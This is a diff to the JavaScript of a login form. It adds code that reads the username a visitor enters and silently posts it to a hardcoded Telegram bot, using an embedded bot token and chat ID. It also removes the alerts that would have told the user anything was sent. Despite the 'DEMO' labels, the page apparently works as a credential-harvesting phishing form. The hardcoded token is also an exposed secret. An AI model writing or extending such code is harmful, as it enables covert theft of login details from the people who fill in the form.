@@ -1,6 +1,13 @@
 const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
 const CHAT_ID = "5613942414";
 
+
+
+
+// =========================
+// EYE TOGGLE
+// =========================
+
 function togglePassword() {
     const passwordField = document.getElementById("password");
     const eyeOpen = document.getElementById("eyeOpen");
@@ -22,24 +29,38 @@ function togglePassword() {
 }
 
 
+// =========================
+// FORM + TELEGRAM
+// =========================
+
 const form = document.getElementById("demoForm");
 
 if (form) {
     form.addEventListener("submit", async function (event) {
         event.preventDefault();
 
+        const username = document
+            .getElementById("username")
+            .value
+            .trim();
+
+        const passwordField = document.getElementById("password");
+
         const telegramMessage =
-            "📋 DEMO TEST\n\n" +
-            "Website form submission received.";
+            "📋 DEMO FORM SUBMISSION\n\n" +
+            "Username: " + username + "\n" +
+            "Second field received: Yes";
 
         try {
             const response = await fetch(
                 `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                 {
                     method: "POST",
+
                     headers: {
                         "Content-Type": "application/json"
                     },
+
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: telegramMessage
@@ -51,16 +72,13 @@ if (form) {
 
             console.log("Telegram response:", result);
 
-            if (result.ok) {
-                alert("Telegram message sent!");
-            } else {
-                alert("Telegram rejected the request.");
-                console.error(result);
+            if (!result.ok) {
+                console.error("Telegram error:", result);
             }
 
         } catch (error) {
             console.error("Telegram request failed:", error);
-            alert("Telegram request failed. Check Console.");
         }
     });
-        }
+}
+
